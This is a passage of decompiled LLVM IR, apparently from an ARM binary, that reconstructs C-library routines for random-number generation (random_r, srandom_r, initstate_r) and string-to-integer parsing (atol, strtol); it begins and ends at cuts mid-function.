  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 3, 4, 1, 2, 8, 9, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17398, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_173c4 = load i32, i32* @r4, align 4
  store i32 %v3_173c4, i32* %stack_var_-8, align 4
  %v1_173c8 = add i32 %tmp, 12
  %v2_173c8 = inttoptr i32 %v1_173c8 to i8*
  %v3_173c8 = load i8, i8* %v2_173c8, align 1
  %v4_173c8 = zext i8 %v3_173c8 to i32
  store i32 %v4_173c8, i32* %r3.global-to-local, align 4
  %v2_173cc = icmp eq i8 %v3_173c8, 0
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_173d8 = add i32 %tmp, 8
  %v2_173d8 = inttoptr i32 %v1_173d8 to i32*
  %v3_173d8 = load i32, i32* %v2_173d8, align 4
  store i32 %v3_173d8, i32* %lr.global-to-local, align 4
  br i1 %v2_173cc, label %dec_label_pc_173e0, label %dec_label_pc_17404

dec_label_pc_173e0:                               ; preds = %entry
  %v1_173e0 = inttoptr i32 %v3_173d8 to i32*
  %v2_173e0 = load i32, i32* %v1_173e0, align 4
  store i32 %v2_173e0, i32* %r2.global-to-local, align 4
  %v2_173e8 = mul i32 %v2_173e0, 1103515245
  %v1_173f0 = add i32 %v2_173e8, 12345
  %tmp6 = bitcast i32 %v1_173f0 to float
  %tmp7 = call float @fabsf(float %tmp6)
  %v1_173f4 = bitcast float %tmp7 to i32
  store i32 %v1_173f4, i32* %r3.global-to-local, align 4
  store i32 %v1_173f4, i32* %v1_173e0, align 4
  %v0_173fc = load i32, i32* %r3.global-to-local, align 4
  %v2_173fc = inttoptr i32 %arg2 to i32*
  store i32 %v0_173fc, i32* %v2_173fc, align 4
  br label %dec_label_pc_17444

dec_label_pc_17404:                               ; preds = %entry
  %v2_17404 = load i32, i32* %arg1, align 4
  store i32 %v2_17404, i32* %r2.global-to-local, align 4
  %v1_17408 = add i32 %tmp, 4
  %v2_17408 = inttoptr i32 %v1_17408 to i32*
  %v3_17408 = load i32, i32* %v2_17408, align 4
  store i32 %v3_17408, i32* %r0.global-to-local, align 4
  %v1_1740c = inttoptr i32 %v2_17404 to i32*
  %v2_1740c = load i32, i32* %v1_1740c, align 4
  store i32 %v2_1740c, i32* %r1.global-to-local, align 4
  %v1_17410 = inttoptr i32 %v3_17408 to i32*
  %v2_17410 = load i32, i32* %v1_17410, align 4
  %v4_17410 = add i32 %v3_17408, 4
  store i32 %v4_17410, i32* %r0.global-to-local, align 4
  %v2_17414 = add i32 %v2_17410, %v2_1740c
  store i32 %v2_17414, i32* %r3.global-to-local, align 4
  store i32 %v2_17414, i32* %v1_1740c, align 4
  %v3_17418 = load i32, i32* %r2.global-to-local, align 4
  %v4_17418 = add i32 %v3_17418, 4
  store i32 %v4_17418, i32* %r2.global-to-local, align 4
  %v0_1741c = load i32, i32* %ip.global-to-local, align 4
  %v1_1741c = add i32 %v0_1741c, 16
  %v2_1741c = inttoptr i32 %v1_1741c to i32*
  %v3_1741c = load i32, i32* %v2_1741c, align 4
  store i32 %v3_1741c, i32* %r1.global-to-local, align 4
  %v0_17420 = load i32, i32* %r3.global-to-local, align 4
  %v3_17420 = udiv i32 %v0_17420, 2
  store i32 %v3_17420, i32* %r3.global-to-local, align 4
  %v3_17424 = icmp ult i32 %v4_17418, %v3_1741c
  %v1_17428 = load i32, i32* %r4.global-to-local, align 4
  %v2_17428 = inttoptr i32 %v1_17428 to i32*
  store i32 %v3_17420, i32* %v2_17428, align 4
  br i1 %v3_17424, label %dec_label_pc_17434, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_17404
  %v1_1742c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_1742c, i32* %r2.global-to-local, align 4
  %v0_1743c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_17434:                               ; preds = %dec_label_pc_17404
  %v0_17434 = load i32, i32* %r0.global-to-local, align 4
  %v1_17434 = load i32, i32* %r1.global-to-local, align 4
  %v3_17434 = icmp ult i32 %v0_17434, %v1_17434
  br i1 %v3_17434, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_17434
  %v1_17438 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_17438, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_17434, %._crit_edge, %bb
  %v0_1743c = phi i32 [ %v0_1743c.pre, %._crit_edge ], [ %v0_17434, %dec_label_pc_17434 ], [ %v1_17438, %bb ]
  %v1_1743c = load i32, i32* %ip.global-to-local, align 4
  %v2_1743c = add i32 %v1_1743c, 4
  %v3_1743c = inttoptr i32 %v2_1743c to i32*
  store i32 %v0_1743c, i32* %v3_1743c, align 4
  %v0_17440 = load i32, i32* %r2.global-to-local, align 4
  %v1_17440 = load i32, i32* %ip.global-to-local, align 4
  %v2_17440 = inttoptr i32 %v1_17440 to i32*
  store i32 %v0_17440, i32* %v2_17440, align 4
  br label %dec_label_pc_17444

dec_label_pc_17444:                               ; preds = %dec_label_pc_173e0, %bb5
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_17448 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17448, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_17420, { 1, 0 }
  uselistorder i32 %v1_173f4, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_17444, { 1, 0 }
  uselistorder label %bb5, { 2, 0, 1 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_17450 = load i32, i32* @r4, align 4
  store i32 %v3_17450, i32* %stack_var_-36, align 4
  %v1_17454 = add i32 %tmp, 12
  %v2_17454 = inttoptr i32 %v1_17454 to i8*
  %v3_17454 = load i8, i8* %v2_17454, align 1
  %v4_17454 = zext i8 %v3_17454 to i32
  %v3_17458 = mul nuw i32 %v4_17454, 16777216
  %v2_1745c = icmp ugt i32 %v3_17458, 67108863
  %v2_17460 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %v2_17468 = icmp ne i8 %v3_17454, 4
  %v3_17468 = and i1 %v2_1745c, %v2_17468
  br i1 %v3_17468, label %.dec_label_pc_1751c_crit_edge, label %dec_label_pc_17470

.dec_label_pc_1751c_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_1751c

dec_label_pc_17470:                               ; preds = %entry
  %v0_17470 = load i32, i32* @r0, align 4
  %v2_17470 = icmp eq i32 %v0_17470, 0
  %v1_17474 = add i32 %tmp, 8
  %v2_17474 = inttoptr i32 %v1_17474 to i32*
  %v3_17474 = load i32, i32* %v2_17474, align 4
  store i32 %v3_17474, i32* %r7.global-to-local, align 4
  br i1 %v2_17470, label %bb, label %bb22

bb:                                               ; preds = %dec_label_pc_17470
  store i32 1, i32* @r0, align 4
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_17470, %bb
  %v0_17480 = phi i32 [ %v0_17470, %dec_label_pc_17470 ], [ 1, %bb ]
  %v2_1747c = icmp eq i8 %v3_17454, 0
  %v2_17480 = inttoptr i32 %v3_17474 to i32*
  store i32 %v0_17480, i32* %v2_17480, align 4
  br i1 %v2_1747c, label %dec_label_pc_17518, label %dec_label_pc_17488

dec_label_pc_17488:                               ; preds = %bb22
  %v1_17488 = add i32 %tmp, 13
  %v2_17488 = inttoptr i32 %v1_17488 to i8*
  %v3_17488 = load i8, i8* %v2_17488, align 1
  store i32 2836, i32* %fp.global-to-local, align 4
  %v0_17494 = load i32, i32* @r0, align 4
  store i32 %v0_17494, i32* %r5.global-to-local, align 4
  %v3_17498 = sext i8 %v3_17488 to i32
  store i32 %v3_17498, i32* %sb.global-to-local, align 4
  %v0_1749c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1749c, i32* %sl.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  %v5_174e024 = icmp sgt i8 %v3_17488, 1
  br i1 %v5_174e024, label %dec_label_pc_174a8, label %dec_label_pc_174e4

dec_label_pc_174a8:                               ; preds = %dec_label_pc_17488, %dec_label_pc_174a8.dec_label_pc_174a8_crit_edge
  %v1_174c0 = phi i32 [ %v1_174c0.pre, %dec_label_pc_174a8.dec_label_pc_174a8_crit_edge ], [ 2836, %dec_label_pc_17488 ]
  %v0_174b826 = phi i32 [ %v0_174d4.pre, %dec_label_pc_174a8.dec_label_pc_174a8_crit_edge ], [ %v0_17494, %dec_label_pc_17488 ]
  %v1_174cc25 = phi i32 [ %v5_174cc, %dec_label_pc_174a8.dec_label_pc_174a8_crit_edge ], [ %v0_1749c, %dec_label_pc_17488 ]
  %v2_174a8 = srem i32 %v0_174b826, ptrtoint ([378 x i8]* @global_var_1f31d.1500 to i32)
  %v2_174b4 = mul i32 %v2_174a8, 16807
  %v2_174bc = sdiv i32 %v0_174b826, ptrtoint ([378 x i8]* @global_var_1f31d.1500 to i32)
  %v2_174c0 = mul i32 %v1_174c0, %v2_174bc
  %v2_174c4 = sub i32 %v2_174b4, %v2_174c0
  %v8_174c4 = icmp slt i32 %v2_174c4, 0
  %v2_174c8 = add i32 %v2_174c4, 2147483647
  %v2_174c8.v2_174c4 = select i1 %v8_174c4, i32 %v2_174c8, i32 %v2_174c4
  store i32 %v2_174c8.v2_174c4, i32* %r5.global-to-local, align 4
  %v2_174cc = add i32 %v1_174cc25, 4
  %v3_174cc = inttoptr i32 %v2_174cc to i32*
  store i32 %v2_174c8.v2_174c4, i32* %v3_174cc, align 4
  %v4_174cc = load i32, i32* %sl.global-to-local, align 4
  %v5_174cc = add i32 %v4_174cc, 4
  store i32 %v5_174cc, i32* %sl.global-to-local, align 4
  %v0_174d0.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_174d0.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_174d4.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_174dc = add i32 %v0_174d0.pre, 1
  store i32 %v1_174dc, i32* %r8.global-to-local, align 4
  %v5_174e0 = icmp slt i32 %v0_174d0.pre, %v1_174d0.pre
  br i1 %v5_174e0, label %dec_label_pc_174a8.dec_label_pc_174a8_crit_edge, label %dec_label_pc_174d0.dec_label_pc_174e4_crit_edge

dec_label_pc_174a8.dec_label_pc_174a8_crit_edge:  ; preds = %dec_label_pc_174a8
  %v1_174c0.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_174a8

dec_label_pc_174d0.dec_label_pc_174e4_crit_edge:  ; preds = %dec_label_pc_174a8
  %v0_174f4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_174e4

dec_label_pc_174e4:                               ; preds = %dec_label_pc_174d0.dec_label_pc_174e4_crit_edge, %dec_label_pc_17488
  %v0_174f4 = phi i32 [ %v0_174f4.pre, %dec_label_pc_174d0.dec_label_pc_174e4_crit_edge ], [ %v0_1749c, %dec_label_pc_17488 ]
  %v0_174e8.lcssa = phi i32 [ %v1_174d0.pre, %dec_label_pc_174d0.dec_label_pc_174e4_crit_edge ], [ %v3_17498, %dec_label_pc_17488 ]
  %v2_174e8 = mul i32 %v0_174e8.lcssa, 10
  store i32 %v2_174e8, i32* @r4, align 4
  %v0_174ec = load i32, i32* %r6.global-to-local, align 4
  %v1_174ec = add i32 %v0_174ec, 14
  %v2_174ec = inttoptr i32 %v1_174ec to i8*
  %v3_174ec = load i8, i8* %v2_174ec, align 1
  %v4_174ec = zext i8 %v3_174ec to i32
  %v3_174f0 = mul nuw i32 %v4_174ec, 16777216
  %v4_174f4 = sdiv i32 %v3_174f0, 4194304
  %v5_174f4 = add i32 %v4_174f4, %v0_174f4
  store i32 %v2_17460, i32* %r5.global-to-local, align 4
  %v1_174fc = inttoptr i32 %v0_174ec to i32*
  store i32 %v5_174f4, i32* %v1_174fc, align 4
  %v3_174fc = add i32 %v0_174ec, 4
  %v4_174fc = inttoptr i32 %v3_174fc to i32*
  %v5_174fc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_174fc, i32* %v4_174fc, align 4
  br label %dec_label_pc_17508

dec_label_pc_17504:                               ; preds = %dec_label_pc_17508
  %v0_1750c = load i32, i32* %r6.global-to-local, align 4
  %v2_17504 = inttoptr i32 %v0_1750c to i32*
  %v3_17504 = call i32 @__GI_random_r(i32* %v2_17504, i32 %v2_17460)
  br label %dec_label_pc_17508

dec_label_pc_17508:                               ; preds = %dec_label_pc_174e4, %dec_label_pc_17504
  %v0_17508 = load i32, i32* @r4, align 4
  %v1_17508 = add i32 %v0_17508, -1
  store i32 %v1_17508, i32* @r4, align 4
  %v6_17508 = icmp slt i32 %v1_17508, 0
  br i1 %v6_17508, label %dec_label_pc_17518, label %dec_label_pc_17504

dec_label_pc_17518:                               ; preds = %dec_label_pc_17508, %bb22
  %v2_17520.pre = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_1751c

dec_label_pc_1751c:                               ; preds = %.dec_label_pc_1751c_crit_edge, %dec_label_pc_17518
  %v2_17520 = phi i32 [ %v3_17450, %.dec_label_pc_1751c_crit_edge ], [ %v2_17520.pre, %dec_label_pc_17518 ]
  %v29_17520 = phi i32 [ -1, %.dec_label_pc_1751c_crit_edge ], [ 0, %dec_label_pc_17518 ]
  store i32 %v2_17520, i32* @r4, align 4
  ret i32 %v29_17520

; uselistorder directives
  uselistorder i32 %v1_17508, { 1, 0 }
  uselistorder i32 %v0_174ec, { 1, 0, 2 }
  uselistorder i32 %v0_174d0.pre, { 1, 0 }
  uselistorder i32 %v5_174cc, { 1, 0 }
  uselistorder i32 %v0_174b826, { 1, 0 }
  uselistorder i32 %v0_1749c, { 1, 0, 2 }
  uselistorder i8 %v3_17454, { 1, 0, 2 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32 ptrtoint ([378 x i8]* @global_var_1f31d.1500 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_1751c, { 1, 0 }
  uselistorder label %dec_label_pc_17508, { 1, 0 }
  uselistorder label %dec_label_pc_174a8, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
}

define i32 @"$d.4"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_17524:
  %v0_17524 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17524, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17524
  %v2_17524 = load i32, i32* @r4, align 4
  %v3_17524 = load i32, i32* @fp, align 4
  %v8_17524 = shl i32 %v2_17524, %v3_17524
  %v9_17524 = and i32 %v8_17524, %arg1
  %v2_1752c = load i32, i32* @sp, align 4
  %v8_1752c = shl i32 %v2_1752c, %arg3
  %v9_1752c = and i32 %v8_1752c, %arg2
  call void @__pseudo_branch(i32 %v9_1752c)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17524, %bb
  %v10_1752c = phi i32 [ %arg1, %dec_label_pc_17524 ], [ %v9_17524, %bb ]
  ret i32 %v10_1752c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_17534 = load i32, i32* @r4, align 4
  store i32 %v3_17534, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg4, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg3, 128
  br i1 %tmp28, label %dec_label_pc_17554, label %dec_label_pc_17544

dec_label_pc_17544:                               ; preds = %entry
  %v2_17544 = icmp ugt i32 %arg3, 254
  %v7_17544 = icmp eq i32 %arg3, 255
  %v2_17548 = xor i1 %v7_17544, true
  %v3_17548 = and i1 %v2_17544, %v2_17548
  br i1 %v3_17548, label %bb, label %bb20

bb:                                               ; preds = %dec_label_pc_17544
  store i32 4, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_17544, %bb
  %v1_1757c7 = phi i32 [ %v3_17534, %dec_label_pc_17544 ], [ 4, %bb ]
  %v2_1754c = xor i1 %v2_17544, true
  %v3_1754c = or i1 %v7_17544, %v2_1754c
  br i1 %v3_1754c, label %bb21, label %bb25

bb21:                                             ; preds = %bb20
  store i32 3, i32* @r4, align 4
  br label %bb25

dec_label_pc_17554:                               ; preds = %entry
  %tmp29 = icmp ugt i32 %arg3, 31
  br i1 %tmp29, label %dec_label_pc_1756c, label %dec_label_pc_1755c

dec_label_pc_1755c:                               ; preds = %dec_label_pc_17554
  %tmp30 = icmp ugt i32 %arg3, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_175d8

.thread10:                                        ; preds = %dec_label_pc_1755c
  store i32 0, i32* @r4, align 4
  br label %bb25

dec_label_pc_1756c:                               ; preds = %dec_label_pc_17554
  %v2_1756c = icmp ugt i32 %arg3, 62
  %v7_1756c = icmp eq i32 %arg3, 63
  %v2_17570 = xor i1 %v7_1756c, true
  %v3_17570 = and i1 %v2_1756c, %v2_17570
  br i1 %v3_17570, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_1756c
  store i32 2, i32* @r4, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_1756c, %bb22
  %v1_1757c6 = phi i32 [ %v3_17534, %dec_label_pc_1756c ], [ 2, %bb22 ]
  %v2_17574 = xor i1 %v2_1756c, true
  %v3_17574 = or i1 %v7_1756c, %v2_17574
  br i1 %v3_17574, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  store i32 1, i32* @r4, align 4
  br label %bb25

bb25:                                             ; preds = %.thread10, %bb21, %bb20, %bb23, %bb24
  %v1_17584 = phi i32 [ 3, %bb21 ], [ %v1_1757c7, %bb20 ], [ %v1_1757c6, %bb23 ], [ 1, %bb24 ], [ 0, %.thread10 ]
  store i32 ptrtoint (i32* @global_var_25330.1495 to i32), i32* %r2.global-to-local, align 4
  %v4_1757c = mul i32 %v1_17584, 4
  %v5_1757c = add i32 %v4_1757c, ptrtoint (i32* @global_var_25330.1495 to i32)
  store i32 %v5_1757c, i32* %r3.global-to-local, align 4
  %v1_17580 = add i32 %v4_1757c, add (i32 ptrtoint (i32* @global_var_25330.1495 to i32), i32 20)
  %v2_17580 = inttoptr i32 %v1_17580 to i32*
  %v3_17580 = load i32, i32* %v2_17580, align 4
  store i32 %v3_17580, i32* %r1.global-to-local, align 4
  %v6_17584 = inttoptr i32 %v5_1757c to i32*
  %v7_17584 = load i32, i32* %v6_17584, align 4
  store i32 %v7_17584, i32* %r2.global-to-local, align 4
  %v1_17588 = add i32 %tmp, 4
  store i32 %v1_17588, i32* @r6, align 4
  %v4_1758c = mul i32 %v3_17580, 4
  %v5_1758c = add i32 %v4_1758c, %v1_17588
  store i32 %v5_1758c, i32* %r3.global-to-local, align 4
  %v2_17590 = add i32 %arg4, 16
  %v3_17590 = inttoptr i32 %v2_17590 to i32*
  store i32 %v5_1758c, i32* %v3_17590, align 4
  %v0_17594 = load i32, i32* %r2.global-to-local, align 4
  %v1_17594 = trunc i32 %v0_17594 to i8
  %v2_17594 = load i32, i32* @r5, align 4
  %v3_17594 = add i32 %v2_17594, 14
  %v4_17594 = inttoptr i32 %v3_17594 to i8*
  store i8 %v1_17594, i8* %v4_17594, align 1
  %v0_17598 = load i32, i32* %r1.global-to-local, align 4
  %v1_17598 = trunc i32 %v0_17598 to i8
  %v2_17598 = load i32, i32* @r5, align 4
  %v3_17598 = add i32 %v2_17598, 13
  %v4_17598 = inttoptr i32 %v3_17598 to i8*
  store i8 %v1_17598, i8* %v4_17598, align 1
  %v0_1759c = load i32, i32* @r4, align 4
  %v1_1759c = trunc i32 %v0_1759c to i8
  %v2_1759c = load i32, i32* @r5, align 4
  %v3_1759c = add i32 %v2_1759c, 12
  %v4_1759c = inttoptr i32 %v3_1759c to i8*
  store i8 %v1_1759c, i8* %v4_1759c, align 1
  %v0_175a0 = load i32, i32* @r6, align 4
  %v1_175a0 = load i32, i32* @r5, align 4
  %v2_175a0 = add i32 %v1_175a0, 8
  %v3_175a0 = inttoptr i32 %v2_175a0 to i32*
  store i32 %v0_175a0, i32* %v3_175a0, align 4
  %v0_175a4 = load i32, i32* @r5, align 4
  store i32 %v0_175a4, i32* %r1.global-to-local, align 4
  %v2_175a8 = inttoptr i32 %arg1 to i32*
  %v3_175a8 = call i32 @srandom_r(i32* %v2_175a8, i32 %v0_175a4)
  store i32 %v3_175a8, i32* %r0.global-to-local, align 4
  %v0_175ac = load i32, i32* @r4, align 4
  %v2_175ac = icmp eq i32 %v0_175ac, 0
  br i1 %v2_175ac, label %bb26, label %.thread4

bb26:                                             ; preds = %bb25
  %v1_175c812 = load i32, i32* @r7, align 4
  %v2_175c813 = inttoptr i32 %v1_175c812 to i32*
  store i32 0, i32* %v2_175c813, align 4
  %v1_175cc = load i32, i32* @r4, align 4
  store i32 %v1_175cc, i32* %r0.global-to-local, align 4
  br label %bb27

.thread4:                                         ; preds = %bb25
  %v1_175b0 = load i32, i32* @r5, align 4
  %v2_175b0 = add i32 %v1_175b0, 4
  %v3_175b0 = inttoptr i32 %v2_175b0 to i32*
  %v4_175b0 = load i32, i32* %v3_175b0, align 4
  %v1_175b4 = load i32, i32* @r6, align 4
  %v3_175b4 = sub i32 %v4_175b0, %v1_175b4
  %v4_175b8 = sdiv i32 %v3_175b4, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_175c0 = mul i32 %v4_175b8, 5
  %v5_175c0 = add i32 %v4_175c0, %v0_175ac
  store i32 %v5_175c0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_175c8 = load i32, i32* @r7, align 4
  %v2_175c8 = inttoptr i32 %v1_175c8 to i32*
  store i32 0, i32* %v2_175c8, align 4
  %v1_175d0 = load i32, i32* %r3.global-to-local, align 4
  %v2_175d0 = load i32, i32* @r7, align 4
  %v3_175d0 = inttoptr i32 %v2_175d0 to i32*
  store i32 %v1_175d0, i32* %v3_175d0, align 4
  %v17_175d4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb27

bb27:                                             ; preds = %bb26, %.thread4
  %v17_175d4 = phi i32 [ %v1_175cc, %bb26 ], [ %v17_175d4.pre, %.thread4 ]
  %v2_175d4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_175d4, i32* %r4.global-to-local, align 4
  ret i32 %v17_175d4

dec_label_pc_175d8:                               ; preds = %dec_label_pc_1755c
  %v0_175d8 = call i32 @__GI___errno_location()
  store i32 %v0_175d8, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_175e0 = inttoptr i32 %v0_175d8 to i32*
  store i32 22, i32* %v2_175e0, align 4
  %v0_175e4 = call i32 @__GI___errno_location()
  %v0_175e8 = load i32, i32* %r4.global-to-local, align 4
  %v2_175e8 = inttoptr i32 %v0_175e4 to i32*
  store i32 %v0_175e8, i32* %v2_175e8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_175f0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_175f0, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i1 %v7_1756c, { 1, 0 }
  uselistorder i1 %v7_17544, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_25330.1495 to i32), { 0, 3, 1, 2 }
  uselistorder i32 %arg3, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %bb25, { 4, 3, 0, 1, 2 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_17600 = call i32 @strtol()
  ret i32 %v0_17600
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_17608 = call i32 @_stdlib_strto_l()
  ret i32 %v0_17608
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2e1e4 to i32), i32* %ip.global-to-local, align 4
  %v0_17618 = load i32, i32* @r1, align 4
  store i32 %v0_17618, i32* %fp.global-to-local, align 4
  %v0_1761c = load i32, i32* @r2, align 4
  store i32 %v0_1761c, i32* %r5.global-to-local, align 4
  %v0_17620 = load i32, i32* @r0, align 4
  store i32 %v0_17620, i32* %r4.global-to-local, align 4
  %v0_17624 = load i32, i32* @r3, align 4
  store i32 %v0_17624, i32* %stack_var_-40, align 4
  %v2_17634.pre = load i32, i32* @global_var_2e1e4, align 4
  br label %dec_label_pc_17630

dec_label_pc_1762c:                               ; preds = %dec_label_pc_17630
  %v1_1762c = add i32 %v0_1766c, 1
  store i32 %v1_1762c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17630

dec_label_pc_17630:                               ; preds = %entry, %dec_label_pc_1762c
  %v0_1766c = phi i32 [ %v0_17620, %entry ], [ %v1_1762c, %dec_label_pc_1762c ]
  %v1_17630 = inttoptr i32 %v0_1766c to i8*
  %v2_17630 = load i8, i8* %v1_17630, align 1
  %v3_17630 = zext i8 %v2_17630 to i32
  %v2_17638 = mul nuw nsw i32 %v3_17630, 2
  %v2_1763c = add i32 %v2_17638, %v2_17634.pre
  %v1_17640 = add i32 %v2_1763c, 1
  %v2_17640 = inttoptr i32 %v1_17640 to i8*
  %v3_17640 = load i8, i8* %v2_17640, align 1
  %v1_17644 = and i8 %v3_17640, 32
  %v2_17644 = icmp eq i8 %v1_17644, 0
  br i1 %v2_17644, label %dec_label_pc_1764c, label %dec_label_pc_1762c

dec_label_pc_1764c:                               ; preds = %dec_label_pc_17630
  %v7_1764c = icmp eq i8 %v2_17630, 43
  br i1 %v7_1764c, label %dec_label_pc_1766c, label %dec_label_pc_17654

dec_label_pc_17654:                               ; preds = %dec_label_pc_1764c
  %v7_17654 = icmp eq i8 %v2_17630, 45
  br i1 %v7_17654, label %dec_label_pc_1766c, label %bb

bb:                                               ; preds = %dec_label_pc_17654
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17670

dec_label_pc_1766c:                               ; preds = %dec_label_pc_1764c, %dec_label_pc_17654
  %storemerge46 = phi i32 [ 1, %dec_label_pc_17654 ], [ 0, %dec_label_pc_1764c ]
  store i32 %storemerge46, i32* %r7.global-to-local, align 4
  %v1_1766c = add i32 %v0_1766c, 1
  store i32 %v1_1766c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17670

dec_label_pc_17670:                               ; preds = %bb, %dec_label_pc_1766c
  %v0_17690 = phi i32 [ %v0_1766c, %bb ], [ %v1_1766c, %dec_label_pc_1766c ]
  %v1_17670 = and i32 %v0_1761c, -17
  %v3_17670 = icmp eq i32 %v1_17670, 0
  br i1 %v3_17670, label %dec_label_pc_1767c, label %bb58

bb58:                                             ; preds = %dec_label_pc_17670
  br label %bb62

dec_label_pc_1767c:                               ; preds = %dec_label_pc_17670
